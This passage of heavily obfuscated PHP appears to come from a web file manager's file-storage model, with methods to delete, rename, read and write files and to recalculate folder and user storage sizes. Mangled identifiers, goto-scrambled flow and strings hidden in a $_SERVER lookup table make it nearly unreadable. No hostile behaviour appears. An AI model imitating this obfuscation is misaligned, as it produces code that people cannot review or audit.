array($c†ﬁ∆áË›[475], $D≠¶Ÿ√îÿ [$c†ﬁ∆áË›[455]] . $aı¢ﬁŒèÑÑ . $c†ﬁ∆áË›[476])); $Fí°¯·ÑìØ = array($c†ﬁ∆áË›[517] => $B•ãœÙÉ–æ[$c†ﬁ∆áË›[455]]); $aù¶øæå≥› = $this->field($c†ﬁ∆áË›[2239])->where($Fí°¯·ÑìØ)->select(); $aâ¥»°Ëˆ® = !1; $DÂèá’á÷ = array($aı¢ﬁŒèÑÑ); if ($aù¶øæå≥›) { $aâ¥»°Ëˆ® = array_to_keyvalue($aù¶øæå≥›, $c†ﬁ∆áË›[33], $c†ﬁ∆áË›[415]); $aâ¥»°Ëˆ® = array_remove_value($aâ¥»°Ëˆ®, $c†ﬁ∆áË›[464]); $DÂèá’á÷ = array_to_keyvalue($aù¶øæå≥›, $c†ﬁ∆áË›[33], $c†ﬁ∆áË›[366]); $DÂèá’á÷[] = $aı¢ﬁŒèÑÑ; } } else { $aâ¥»°Ëˆ® = array($D≠¶Ÿ√îÿ [$c†ﬁ∆áË›[415]]); $DÂèá’á÷ = array($aı¢ﬁŒèÑÑ); } Model($c†ﬁ∆áË›[497])->eventRemove($aı¢ﬁŒèÑÑ); $this->removeRelevance($DÂèá’á÷, $aâ¥»°Ëˆ®); } $this->folderSizeReset($D≠¶Ÿ√îÿ [$c†ﬁ∆áË›[457]]); goto FÃÆ‰îëÍﬁ; cØ≤◊”ªûé: $this->lockMoveEnd($aı¢ﬁŒèÑÑ); Hook::trigger($c†ﬁ∆áË›[1383], $F–óöì√∏Œ, $AÌ˜ÖÉÔÒã); return !0; goto B€œ’ãÊâ¿; B€œ’ãÊâ¿: } public function removeArray($f›ß∫‡Ωì“) { if (!$f›ß∫‡Ωì“) { return !0; } } public function removeRelevance($cßˆËÏ≠’±, $BÔ«ÛÌÊíô) { goto C∫ïÿ”¯‡Â; D©√¯Èª⁄È: Model($bÙµÖ´∆áÕ[1990])->removeBySource($cßˆËÏ≠’±); Model($bÙµÖ´∆áÕ[2230])->removeBySource($cßˆËÏ≠’±); $this->where($AúÙª¬”æÜ)->delete(); goto B∂Ü’ﬂˆÿè; f‘éÿ◊≤Âê: if (!$cßˆËÏ≠’±) { return !1; } $AúÙª¬”æÜ = array($bÙµÖ´∆áÕ[380] => array($bÙµÖ´∆áÕ[381], $cßˆËÏ≠’±)); Model($bÙµÖ´∆áÕ[2238])->where($AúÙª¬”æÜ)->delete(); goto CˆŒËÑç≠ñ; B∂Ü’ﬂˆÿè: Model($bÙµÖ´∆áÕ[418])->remove($BÔ«ÛÌÊíô); for ($a˜∂©ççºõ = 0; $a˜∂©ççºõ < count($cßˆËÏ≠’±); $a˜∂©ççºõ++) { $this->sourceCacheClear($cßˆËÏ≠’±[$a˜∂©ççºõ]); } goto CÁÁ£ûé£Ó; CˆŒËÑç≠ñ: Model($bÙµÖ´∆áÕ[409])->where($AúÙª¬”æÜ)->delete(); Model($bÙµÖ´∆áÕ[2240])->where($AúÙª¬”æÜ)->delete(); Model($bÙµÖ´∆áÕ[497])->where($AúÙª¬”æÜ)->delete(); goto D©√¯Èª⁄È; C∫ïÿ”¯‡Â: $bÙµÖ´∆áÕ =& $_SERVER[£¿ÌÙëü¡¯¯]; $cßˆËÏ≠’± = array_unique(array_filter($cßˆËÏ≠’±)); $BÔ«ÛÌÊíô = array_unique(array_filter($BÔ«ÛÌÊíô)); goto f‘éÿ◊≤Âê; CÁÁ£ûé£Ó: } public function rename($a‰Ç√»…î“, $a◊≈∞çªÙâ) { goto E∑€çß•’‹; d»Âç∆óΩÑ: if (!$f¯∑èπá«·[$BΩ¿—êŒ∏à[367]] == $BΩ¿—êŒ∏à[84]) { $eÍ·∆áå’’[$BΩ¿—êŒ∏à[369]] = get_path_ext($a◊≈∞çªÙâ); } Model($BΩ¿—êŒ∏à[497])->eventRename($a‰Ç√»…î“, $f¯∑èπá«·[$BΩ¿—êŒ∏à[28]], $a◊≈∞çªÙâ); $this->sourceCacheClear($a‰Ç√»…î“); goto A≠ìäÆç•; A≠ìäÆç•: $this->setNamePinyin($a‰Ç√»…î“, $eÍ·∆áå’’[$BΩ¿—êŒ∏à[28]], !1); $this->updateModifyTime($f¯∑èπá«·[$BΩ¿—êŒ∏à[457]]); return $this->where(array($BΩ¿—êŒ∏à[380] => $a‰Ç√»…î“))->data($eÍ·∆áå’’)->save(); goto eŒ¢ƒ≈´ã†; E⁄‹è™§≠Ñ: $f≠∞¿áúËÏ = $this->fileNameExist($f¯∑èπá«·[$BΩ¿—êŒ∏à[457]], $a◊≈∞çªÙâ); if ($f≠∞¿áúËÏ) { return !1; } $eÍ·∆áå’’ = array($BΩ¿—êŒ∏à[383] => $a◊≈∞çªÙâ, $BΩ¿—êŒ∏à[516] => USER_ID); goto d»Âç∆óΩÑ; E∑€çß•’‹: $BΩ¿—êŒ∏à =& $_SERVER[£¿ÌÙëü¡¯¯]; $f¯∑èπá«· = $this->sourceInfo($a‰Ç√»…î“); if (!$f¯∑èπá«·) { return !1; } goto E⁄‹è™§≠Ñ; eŒ¢ƒ≈´ã†: } public function setNamePinyin($C≈ã…∏òïÈ, $FåàïÁƒøå, $eÜºƒ†ÃÉø = true) { $F¨ÑÕ€≥Á≠ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EïåÀ¥“Àí = Input::check($FåàïÁƒøå, $F¨ÑÕ€≥Á≠[520]); if ($eÜºƒ†ÃÉø && !$EïåÀ¥“Àí) { return; } if (!$EïåÀ¥“Àí) { $this->metaSet($C≈ã…∏òïÈ, $F¨ÑÕ€≥Á≠[412], null); $this->metaSet($C≈ã…∏òïÈ, $F¨ÑÕ€≥Á≠[411], null); return; } $C‹êÕ…ﬁûî = array($F¨ÑÕ€≥Á≠[412] => str_replace($F¨ÑÕ€≥Á≠[50], $F¨ÑÕ€≥Á≠[33], Pinyin::encode($FåàïÁƒøå)), $F¨ÑÕ€≥Á≠[411] => Pinyin::encode($FåàïÁƒøå, $F¨ÑÕ€≥Á≠[521])); $this->metaSet($C≈ã…∏òïÈ, $C‹êÕ…ﬁûî); } public function getContent($C«æß¡ê¡é) { goto b¥ì≥æë∂°; Eﬁﬂèåµ◊Ú: if ($a±¯˘„ å¢[$BÑ¬¶‚Ü∂Æ[78]] == 0) { return $BÑ¬¶‚Ü∂Æ[33]; } $f∑¬Í˜§≤é = $BÑ¬¶‚Ü∂Æ[2241] . $a±¯˘„ å¢[$BÑ¬¶‚Ü∂Æ[160]]; if ($a±¯˘„ å¢[$BÑ¬¶‚Ü∂Æ[78]] <= 1024 * 10) { $cèÖÃìáÚø = Cache::get($f∑¬Í˜§≤é); if (!$cèÖÃìáÚø) { $cèÖÃìáÚø = IO::getContent($a±¯˘„ å¢[$BÑ¬¶‚Ü∂Æ[76]]); Cache::set($f∑¬Í˜§≤é, $cèÖÃìáÚø); } return $cèÖÃìáÚø; } goto A•·Àâé∂ç; A•·Àâé∂ç: return IO::getContent($a±¯˘„ å¢[$BÑ¬¶‚Ü∂Æ[76]]); goto D„Ñ‰„æﬂ¡; b¥ì≥æë∂°: $BÑ¬¶‚Ü∂Æ =& $_SERVER[£¿ÌÙëü¡¯¯]; $a±¯˘„ å¢ = $this->fileInfoGet($C«æß¡ê¡é); if (!$a±¯˘„ å¢) { return !1; } goto Eﬁﬂèåµ◊Ú; D„Ñ‰„æﬂ¡: } public function setDesc($aÆÙ˘Éãòﬁ, $cÙ∆àÌ‰Âú) { $DÃüÉÆøí◊ =& $_SERVER[£¿ÌÙëü¡¯¯]; Model($DÃüÉÆøí◊[497])->eventAddDesc($aÆÙ˘Éãòﬁ, $cÙ∆àÌ‰Âú); return $this->metaSet($aÆÙ˘Éãòﬁ, $DÃüÉÆøí◊[401], $cÙ∆àÌ‰Âú); } public function setContent($f∫ÇË¢“øí, $BœÕËûñ…Ò = '') { goto b¯û√Ö¶ ô; b¯û√Ö¶ ô: $d√é¨ÿ‘ =& $_SERVER[£¿ÌÙëü¡¯¯]; $D≤É«∆´çæ = $this->sourceInfo($f∫ÇË¢“øí); $cöŸﬂΩèà» = $this->fileInfoGet($f∫ÇË¢“øí); goto fˆÖÒ¨≥ôÆ; eÜµô„—Œ: $E≈âÀ⁄‰ûè = $this->fileHistory($D≤É«∆´çæ, $a»î¯™ΩÌê[$d√é¨ÿ‘[415]], $a»î¯™ΩÌê[$d√é¨ÿ‘[78]]); if (!$E≈âÀ⁄‰ûè) { return Model($d√é¨ÿ‘[418])->remove($a»î¯™ΩÌê[$d√é¨ÿ‘[415]]); } $this->folderSizeReset($D≤É«∆´çæ[$d√é¨ÿ‘[457]]); goto Düº†ƒ”ı†; Düº†ƒ”ı†: return !0; goto dÒòµ≥◊åŒ; fˆÖÒ¨≥ôÆ: if (!$cöŸﬂΩèà» || !$D≤É«∆´çæ) { return !1; } $this->checkLock($f∫ÇË¢“øí); $a»î¯™ΩÌê = Model($d√é¨ÿ‘[418])->addFileByContent($BœÕËûñ…Ò, $D≤É«∆´çæ[$d√é¨ÿ‘[28]]); goto eÜµô„—Œ; dÒòµ≥◊åŒ: } public function fileSubstr($aœ®ﬂ◊åƒﬁ, $EÖã®π…„», $EÁΩ¬äıí•) { $Eâ™ü·¢ Ã = $this->fileInfoGet($aœ®ﬂ◊åƒﬁ); if (!$Eâ™ü·¢ Ã) { return !1; } return IO::fileSubstr($Eâ™ü·¢ Ã[$_SERVER[£¿ÌÙëü¡¯¯][76]], $EÖã®π…„», $EÁΩ¬äıí•); } public function fileInfoGet($FÉ †˘Ïî—) { goto B„àÀçëé·; f’÷í◊ñÁ‰: return $F†¬ˆÉÃò•; goto Aå‡‹˘—‰Â; AñŸïò¯Ù‡: $F†¬ˆÉÃò• = Model($d›ÀÑ™∫åﬂ[418])->fileInfo($AèπõÿœáÌ[$d›ÀÑ™∫åﬂ[415]]); if ($F†¬ˆÉÃò•) { $F†¬ˆÉÃò•[$d›ÀÑ™∫åﬂ[28]] = $AèπõÿœáÌ[$d›ÀÑ™∫åﬂ[28]]; } self::$cacheFileInfo[$c∆ˆéÃ®»à] = $F†¬ˆÉÃò•; goto f’÷í◊ñÁ‰; aÜáÙ±ñ≤ì: $c∆ˆéÃ®»à = $d›ÀÑ™∫åﬂ[421] . $AèπõÿœáÌ[$d›ÀÑ™∫åﬂ[415]]; $BœùÕ«¯Éî = _get(self::$cacheFileInfo, $c∆ˆéÃ®»à); if ($BœùÕ«¯Éî) { return $BœùÕ«¯Éî; } goto AñŸïò¯Ù‡; B„àÀçëé·: $d›ÀÑ™∫åﬂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $AèπõÿœáÌ = $this->sourceInfo($FÉ †˘Ïî—); if (!$AèπõÿœáÌ || $AèπõÿœáÌ[$d›ÀÑ™∫åﬂ[367]]) { return !1; } goto aÜáÙ±ñ≤ì; Aå‡‹˘—‰Â: } private function folderChildrenNumber($a˘ƒ’òáûÁ) { $cô–©¡Õ ≈ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eÏàÛí®ñû = $this->sourceInfo($a˘ƒ’òáûÁ); $bæ÷Ç—ﬁ√– = array($cô–©¡Õ ≈[517] => array($cô–©¡Õ ≈[475], $eÏàÛí®ñû[$cô–©¡Õ ≈[455]] . $a˘ƒ’òáûÁ . $cô–©¡Õ ≈[476]), $cô–©¡Õ ≈[392] => 0, $cô–©¡Õ ≈[510] => 1); $AÈ–Ãûùà◊ = $this->where($bæ÷Ç—ﬁ√–)->count(); $AãÕ·ñÛéÇ = $this->where($bæ÷Ç—ﬁ√–)->where(array($cô–©¡Õ ≈[510] => 0))->count(); return array($cô–©¡Õ ≈[82] => $AãÕ·ñÛéÇ, $cô–©¡Õ ≈[83] => $AÈ–Ãûùà◊); } public function pathInfo($E≠Éì€Í√, $dŸå Œ†Âç = false) { goto D‘û≈ë°È°; DÏÀ¶ƒÉ≤Ü: $b¿Í‹∞àÈ´ = $this->_listDataApplyItem($b¿Í‹∞àÈ´, $dŸå Œ†Âç); self::$cachePathInfo[$aÏ·¬£ÿµ§] = $b¿Í‹∞àÈ´; return $b¿Í‹∞àÈ´; goto Có‚ Ú÷êÒ; D‘û≈ë°È°: $E„™ÜäÎ≠† =& $_SERVER[£¿ÌÙëü¡¯¯]; $aÏ·¬£ÿµ§ = $E„™ÜäÎ≠†[407] . intval($dŸå Œ†Âç) . $E„™ÜäÎ≠†[408] . $E≠Éì€Í√; $b„ﬁ›ñ‰∂Î = _get(self::$cachePathInfo, $aÏ·¬£ÿµ§); goto C∂ÌéÚ™ü‚; C∂ÌéÚ™ü‚: if ($b„ﬁ›ñ‰∂Î) { return $b„ﬁ›ñ‰∂Î; } $b¿Í‹∞àÈ´ = $this->sourceInfo($E≠Éì€Í√); if (!$b¿Í‹∞àÈ´) { return !1; } goto DÏÀ¶ƒÉ≤Ü; Có‚ Ú÷êÒ: } public static $cachePathInfoMore = array(); public function pathInfoMore($Eªäæ‹±œª) { goto f◊øõœÕ›¡; f◊øõœÕ›¡: $eÏâ·ÑΩ·˜ =& $_SERVER[£¿ÌÙëü¡¯¯]; $E…±ƒË∞öÚ = _get(self::$cachePathInfoMore, $Eªäæ‹±œª); if ($E…±ƒË∞öÚ) { return $E…±ƒË∞öÚ; } goto E´öÕ§È•; E´öÕ§È•: $aã¯∆Ü–Ú = $this->pathInfo($Eªäæ‹±œª); if (!$aã¯∆Ü–Ú) { return !1; } if ($aã¯∆Ü–Ú[$eÏâ·ÑΩ·˜[367]] == $eÏâ·ÑΩ·˜[84]) { $aã¯∆Ü–Ú[$eÏâ·ÑΩ·˜[81]] = $this->folderChildrenNumber($Eªäæ‹±œª); } goto B∏Ù≥∞ŸŒ…; B∏Ù≥∞ŸŒ…: self::$cachePathInfoMore[$Eªäæ‹±œª] = $aã¯∆Ü–Ú; return $aã¯∆Ü–Ú; goto aﬁñÑó©”«; aﬁñÑó©”«: } public function sourceInfo($aŸ·„†¢ó∏) { $f–ã·À⁄∫Ë =& $_SERVER[£¿ÌÙëü¡¯¯]; $f—ÛƒÊí®Ü = $f–ã·À⁄∫Ë[406] . $aŸ·„†¢ó∏; $a„ã≠∂πºı = _get(self::$cacheSourceInfo, $f—ÛƒÊí®Ü); if ($a„ã≠∂πºı) { return $a„ã≠∂πºı; } self::$cacheSourceInfo[$f—ÛƒÊí®Ü] = $this->where(array($f–ã·À⁄∫Ë[366] => $aŸ·„†¢ó∏))->find(); return self::$cacheSourceInfo[$f—ÛƒÊí®Ü]; } public function sourceCacheClear($fæ€∆Ç°äâ = false) { if ($fæ€∆Ç°äâ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[£¿ÌÙëü¡¯¯][406] . $fæ€∆Ç°äâ]); } public function pathInfoByPath($AÉ≠ëÂŒü≥, $DàìÔÒ÷®Â) { $B¬ò˘ƒ√ò“ =& $_SERVER[£¿ÌÙëü¡¯¯]; $féπ´„îÌã = !$DàìÔÒ÷®Â ? array() : explode($B¬ò˘ƒ√ò“[8], trim($DàìÔÒ÷®Â, $B¬ò˘ƒ√ò“[8])); $BÍıÍ£äß± = $AÉ≠ëÂŒü≥; foreach ($féπ´„îÌã as $F„Ëä≤è†ÿ) { $BÉ´∏¢«† = array($B¬ò˘ƒ√ò“[457] => $BÍıÍ£äß±, $B¬ò˘ƒ√ò“[28] => $F„Ëä≤è†ÿ); $dÿ∑é‡ÿÇ€ = $this->where($BÉ´∏¢«†)->select(); if (!$dÿ∑é‡ÿÇ€) { return !1; } $dÿ∑é‡ÿÇ€ = array_sort_by($dÿ∑é‡ÿÇ€, $B¬ò˘ƒ√ò“[393]); $BÍıÍ£äß± = $dÿ∑é‡ÿÇ€[0][$B¬ò˘ƒ√ò“[366]]; } return $this->pathInfo($BÍıÍ£äß±, !0); } protected function updateModifyTime($d¬ï¨ì‚ §) { goto aóÒÊû÷ı–; A°ä•Ëº–∑: $this->where($CõÓÜ‹€≥”)->save($b®€ª¢Ë≠Ò); goto BÜÙ—ù´ôâ; aóÒÊû÷ı–: $e‰âÓ”Ò◊Á =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$d¬ï¨ì‚ §) { return; } if (!is_array($d¬ï¨ì‚ §)) { $d¬ï¨ì‚ § = array($d¬ï¨ì‚ §); } goto BØÂàà–˜Ì; BØÂàà–˜Ì: foreach ($d¬ï¨ì‚ § as $C¯çÎπ¿ŒÎ => $E¨µ–§„Û–) { $d¬ï¨ì‚ §[$C¯çÎπ¿ŒÎ] = intval($E¨µ–§„Û–); } $CõÓÜ‹€≥” = array($e‰âÓ”Ò◊Á[366] => array($e‰âÓ”Ò◊Á[7], $d¬ï¨ì‚ §)); $b®€ª¢Ë≠Ò = array($e‰âÓ”Ò◊Á[516] => USER_ID, $e‰âÓ”Ò◊Á[387] => time()); goto A°ä•Ëº–∑; BÜÙ—ù´ôâ: } public function folderSizeReset($D‹ê√Ù∂ä) { goto FÜ‹…ˆûÖ ; FÜ‹…ˆûÖ : $bÉåÆÿÑôì =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($this->statusIgnoreResetSpace) { return; } $e·π˜√Ï = $bÉåÆÿÑôì[2242] . $D‹ê√Ù∂ä; goto BÈ»œçÙû¡; fœ·‰–∆Ó: $câ‹Ã›À∂≈ = $E£îπ‡úøŸ - intval($E—Ã—ÒêŒ±[$bÉåÆÿÑôì[78]]); if ($câ‹Ã›À∂≈ == 0) { return CacheLock::unlock($e·π˜√Ï); } $this->where(array($bÉåÆÿÑôì[380] => $D‹ê√Ù∂ä))->setField($bÉåÆÿÑôì[78], $E£îπ‡úøŸ); goto Fı±©üÉ÷“; BÈ»œçÙû¡: CacheLock::lock($e·π˜√Ï, 20); $this->sourceCacheClear($D‹ê√Ù∂ä); $E—Ã—ÒêŒ± = $this->sourceInfo($D‹ê√Ù∂ä); goto cÓ∞ÆÔ¯–¬; Fı±©üÉ÷“: $Fœ∑ì›áµı = $this->parentLevelArray($E—Ã—ÒêŒ±[$bÉåÆÿÑôì[455]]); if ($Fœ∑ì›áµı) { $e œ•ÊÙçå = array($bÉåÆÿÑôì[366] => array($bÉåÆÿÑôì[381], $Fœ∑ì›áµı)); $this->where($e œ•ÊÙçå)->setAdd($bÉåÆÿÑôì[78], $câ‹Ã›À∂≈); } $this->targetSpaceUpdate($E—Ã—ÒêŒ±[$bÉåÆÿÑôì[368]], $E—Ã—ÒêŒ±[$bÉåÆÿÑôì[452]]); goto EÉÜﬂÆ©Îª; cÓ∞ÆÔ¯–¬: $e œ•ÊÙçå = array($bÉåÆÿÑôì[365] => $D‹ê√Ù∂ä, $bÉåÆÿÑôì[392] => 0); $E£îπ‡úøŸ = $this->where($e œ•ÊÙçå)->sum($bÉåÆÿÑôì[78]); $E£îπ‡úøŸ = intval($E£îπ‡úøŸ); goto fœ·‰–∆Ó; EÉÜﬂÆ©Îª: CacheLock::unlock($e·π˜√Ï); goto cÂªéå®ÉÇ; cÂªéå®ÉÇ: } public function folderSizeResetChildren($C‚ÈÓÑà§ª) { goto aé€Ñíá≈≤; câõ»ä¬ìã: $AÃ—ª‚⁄Ñø = array($E∞¢’∂±Ú‘[510] => 1, $E∞¢’∂±Ú‘[517] => array($E∞¢’∂±Ú‘[475], $D—‹€ÕΩı—[$E∞¢’∂±Ú‘[455]] . $C‚ÈÓÑà§ª . $E∞¢’∂±Ú‘[476])); $AÌ¥É°√ä = $E∞¢’∂±Ú‘[2243]; $Fπ´≥ÿÌ√´ = $this->field($AÌ¥É°√ä)->where($AÃ—ª‚⁄Ñø)->select(); goto c® œ≥ÿä≥; Aﬂ„ÉØÂ†¬: foreach ($Fπ´≥ÿÌ√´ as $d¶≥’…°ßÀ) { if ($d¶≥’…°ßÀ[$E∞¢’∂±Ú‘[78]] == $d¶≥’…°ßÀ[$E∞¢’∂±Ú‘[2244]]) { continue; } $có¡êå–è»[] = array($E∞¢’∂±Ú‘[366], $d¶≥’…°ßÀ[$E∞¢’∂±Ú‘[366]], $E∞¢’∂±Ú‘[78], $d¶≥’…°ßÀ[$E∞¢’∂±Ú‘[78]]); } $this->saveAll($có¡êå–è»); goto E≥¬ã÷ìÔÑ; aé€Ñíá≈≤: $E∞¢’∂±Ú‘ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->sourceCacheClear($C‚ÈÓÑà§ª); $D—‹€ÕΩı— = $this->sourceInfo($C‚ÈÓÑà§ª); goto câõ»ä¬ìã; c® œ≥ÿä≥: $AÃ—ª‚⁄Ñø[$E∞¢’∂±Ú‘[367]] = 0; $Bµ´‘±«ë = $this->field($AÌ¥É°√ä)->where($AÃ—ª‚⁄Ñø)->select(); if (!$Bµ´‘±«ë) { return; } goto aµ™¯ÊÍã®; Dåç¯ﬁ»®ö: foreach ($Bµ´‘±«ë as $d¶≥’…°ßÀ) { $a »ŒüÕµ£ = $d¶≥’…°ßÀ[$E∞¢’∂±Ú‘[457]] . $E∞¢’∂±Ú‘[33]; if (!isset($Fπ´≥ÿÌ√´[$a »ŒüÕµ£])) { continue; } if ($d¶≥’…°ßÀ[$E∞¢’∂±Ú‘[393]] == $Fπ´≥ÿÌ√´[$a »ŒüÕµ£][$E∞¢’∂±Ú‘[393]]) { $Fπ´≥ÿÌ√´[$a »ŒüÕµ£][$E∞¢’∂±Ú‘[78]] += $d¶≥’…°ßÀ[$E∞¢’∂±Ú‘[78]]; } } foreach ($Fπ´≥ÿÌ√´ as $d¶≥’…°ßÀ) { $FøÉñ‚´ÌÏ = $this->parentLevelArray($d¶≥’…°ßÀ[$E∞¢’∂±Ú‘[455]]); foreach ($FøÉñ‚´ÌÏ as $a »ŒüÕµ£) { $a »ŒüÕµ£ = $a »ŒüÕµ£ . $E∞¢’∂±Ú‘[33]; if (!isset($Fπ´≥ÿÌ√´[$a »ŒüÕµ£])) { continue; } if ($d¶≥’…°ßÀ[$E∞¢’∂±Ú‘[393]] == $Fπ´≥ÿÌ√´[$a »ŒüÕµ£][$E∞¢’∂±Ú‘[393]]) { $Fπ´≥ÿÌ√´[$a »ŒüÕµ£][$E∞¢’∂±Ú‘[78]] += $d¶≥’…°ßÀ[$E∞¢’∂±Ú‘[78]]; } } } $có¡êå–è» = array(); goto Aﬂ„ÉØÂ†¬; aµ™¯ÊÍã®: $Fπ´≥ÿÌ√´[] = $D—‹€ÕΩı—; $Fπ´≥ÿÌ√´ = array_to_keyvalue($Fπ´≥ÿÌ√´, $E∞¢’∂±Ú‘[366]); foreach ($Fπ´≥ÿÌ√´ as $Bßê‘•ò˜ù => $d¶≥’…°ßÀ) { $Fπ´≥ÿÌ√´[$Bßê‘•ò˜ù][$E∞¢’∂±Ú‘[2244]] = $Fπ´≥ÿÌ√´[$Bßê‘•ò˜ù][$E∞¢’∂±Ú‘[78]]; $Fπ´≥ÿÌ√´[$Bßê‘•ò˜ù][$E∞¢’∂±Ú‘[78]] = 0; } goto Dåç¯ﬁ»®ö; E≥¬ã÷ìÔÑ: } public function userSpaceReset($F∂ˆñà“åˆ = false) { $BÂ¢Õπ∂∆É =& $_SERVER[£¿ÌÙëü¡¯¯]; $Eí©— ‚Ç∂ = $this->where(array($BÂ¢Õπ∂∆É[368] => self::TYPE_USER, $BÂ¢Õπ∂∆É[452] => $F∂ˆñà“åˆ, $BÂ¢Õπ∂∆É[367] => 0))->sum($BÂ¢Õπ∂∆É[78]); Model($BÂ¢Õπ∂∆É[466])->userEdit($F∂ˆñà“åˆ, array($BÂ¢Õπ∂∆É[1999] => $Eí©— ‚Ç∂)); } public function targetSpaceUpdate($F„—π»ìã€, $cƒÍ»Æﬂòˆ) { $Cé£·√∫ë® =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$cƒÍ»Æﬂòˆ) { return; } if (!in_array($F„—π»ìã€, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $eÇ‰Âåë›• = $this->targetSpaceSize($F„—π»ìã€, $cƒÍ»Æﬂòˆ); if ($F„—π»ìã€ == self::TYPE_USER) { Model($Cé£·√∫ë®[466])->userEdit($cƒÍ»Æﬂòˆ, array($Cé£·√∫ë®[1999] => $eÇ‰Âåë›•)); } else { if ($F„—π»ìã€ == self::TYPE_GROUP) { Model($Cé£·√∫ë®[454])->groupEdit($cƒÍ»Æﬂòˆ, array($Cé£·√∫ë®[1999] => $eÇ‰Âåë›•)); } } } public function targetSpaceSize($F≥ñ˜‚ñ∂‚, $fì”øâß˘ä) { goto Bå€óâë∂á; Bå€óâë∂á: $båÖÔı√æ≠ =& $_SERVER[£¿ÌÙëü¡¯¯]; $d™Ïÿ≤Ë¥∆ = $this->sourceRoot($F≥ñ˜‚ñ∂‚, $fì”øâß˘ä, !0); if (!$d™Ïÿ≤Ë¥∆) { return 0; } goto eíÿêÜœã; D«„£í·çÓ: return $dé—èµπ◊É; goto C‹Íü¶é∂í; eíÿêÜœã: $dé—èµπ◊É = floatval($d™Ïÿ≤Ë¥∆[$båÖÔı√æ≠[78]]); $Dâ∫ÚêŒàŒ = array($båÖÔı√æ≠[517] => array($båÖÔı√æ≠[475], $båÖÔı√æ≠[2084] . $d™Ïÿ≤Ë¥∆[$båÖÔı√æ≠[366]] . $båÖÔı√æ≠[476])); $Fœ«ƒÏÉÔº = Model($båÖÔı√æ≠[391])->field($båÖÔı√æ≠[380])->where($Dâ∫ÚêŒàŒ)->select(); goto F…ØÈ…ÙÊ¿; F…ØÈ…ÙÊ¿: $Fœ«ƒÏÉÔº = array_to_keyvalue($Fœ«ƒÏÉÔº, $båÖÔı√æ≠[33], $båÖÔı√æ≠[366]); $Fœ«ƒÏÉÔº = array_unique(array_filter($Fœ«ƒÏÉÔº)); if ($Fœ«ƒÏÉÔº) { $Dâ∫ÚêŒàŒ = array($båÖÔı√æ≠[380] => array($båÖÔı√æ≠[381], $Fœ«ƒÏÉÔº)); $dé—èµπ◊É += floatval($this->where($Dâ∫ÚêŒàŒ)->sum($båÖÔı√æ≠[78])); } goto D«„£í·çÓ; C‹Íü¶é∂í: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($D°Ωç∑Ø‘Ÿ) { return $this->fileTypeProfile($D°Ωç∑Ø‘Ÿ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($d°∏—¿’ıˆ) { return $this->fileTypeProfile($d°∏—¿’ıˆ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($CÖ–ç£æá†, $F¡É»ø∆™) { goto A´›ŒáÕ©√; A´›ŒáÕ©√: $b¥˜ŒŸ∞€Ö =& $_SERVER[£¿ÌÙëü¡¯¯]; $B°ïÎúÂØ› = $b¥˜ŒŸ∞€Ö[2245] . $CÖ–ç£æá† . $b¥˜ŒŸ∞€Ö[71] . $F¡É»ø∆™; $bœÆû„ÿƒ» = Cache::get($B°ïÎúÂØ›); goto AæØÒÂÎ≈–; E÷…√ºÂÓ≈: foreach ($e≤ãÖ–ÍÑ„ as $f∫¿âÃ €  => $E¨Ïé´´å™) { $b¨¨Úπô¯µ[$b¥˜ŒŸ∞€Ö[369]] = $this->fileTypeWhere($f∫¿âÃ € ); $d«ÇìºéÂˆ[$f∫¿âÃ € ] = array($b¥˜ŒŸ∞€Ö[2247] => $E¨Ïé´´å™[$b¥˜ŒŸ∞€Ö[28]], $b¥˜ŒŸ∞€Ö[2248] => $this->where($b¨¨Úπô¯µ)->count(), $b¥˜ŒŸ∞€Ö[512] => $this->where($b¨¨Úπô¯µ)->sum($b¥˜ŒŸ∞€Ö[78])); } Cache::set($B°ïÎúÂØ›, $d«ÇìºéÂˆ, 1200); return $d«ÇìºéÂˆ; goto f®¿Ñ¥ÿëº; F‰∆ˆ¶µﬂû: $d«ÇìºéÂˆ = array(); $d«ÇìºéÂˆ[$b¥˜ŒŸ∞€Ö[2246]] = array($b¥˜ŒŸ∞€Ö[2247] => LNG($b¥˜ŒŸ∞€Ö[2246]), $b¥˜ŒŸ∞€Ö[2248] => $this->where($b¨¨Úπô¯µ)->count(), $b¥˜ŒŸ∞€Ö[512] => $this->where($b¨¨Úπô¯µ)->sum($b¥˜ŒŸ∞€Ö[78])); $e≤ãÖ–ÍÑ„ = KodIO::fileTypeList(); goto E÷…√ºÂÓ≈; AæØÒÂÎ≈–: if ($bœÆû„ÿƒ») { return $bœÆû„ÿƒ»; } $b¨¨Úπô¯µ = array($b¥˜ŒŸ∞€Ö[510] => 0); if ($CÖ–ç£æá† != !1) { $b¨¨Úπô¯µ[$b¥˜ŒŸ∞€Ö[452]] = $CÖ–ç£æá†; $b¨¨Úπô¯µ[$b¥˜ŒŸ∞€Ö[368]] = $F¡É»ø∆™; } goto F‰∆ˆ¶µﬂû; f®¿Ñ¥ÿëº: } public function fileNameExist($f®ÍÊ‘ﬂ⁄¡, $Eïµ≥∫Ú§ß) { $Dãπ“ÆØäÒ =& $_SERVER[£¿ÌÙëü¡¯¯]; $B¢ˆõÚÁ¨Ç = $this->childList($f®ÍÊ‘ﬂ⁄¡); foreach ($B¢ˆõÚÁ¨Ç as $B©ñ æâ¡) { if ($B©ñ æâ¡[$Dãπ“ÆØäÒ[28]] == $Eïµ≥∫Ú§ß) { return $B©ñ æâ¡[$Dãπ“ÆØäÒ[366]]; } } return !1; } public function childList($BåƒﬂÙÕÆÁ) { $C±Éõëç˜Û =& $_SERVER[£¿ÌÙëü¡¯¯]; $Cû‚ÓÊ“ôå = array($C±Éõëç˜Û[457] => intval($BåƒﬂÙÕÆÁ), $C±Éõëç˜Û[393] => 0); $eƒÀ ¨ÿŒã = $this->cacheMemory()->where($Cû‚ÓÊ“ôå)->select(); $eƒÀ ¨ÿŒã = $eƒÀ ¨ÿŒã ? $eƒÀ ¨ÿŒã : array(); foreach ($eƒÀ ¨ÿŒã as 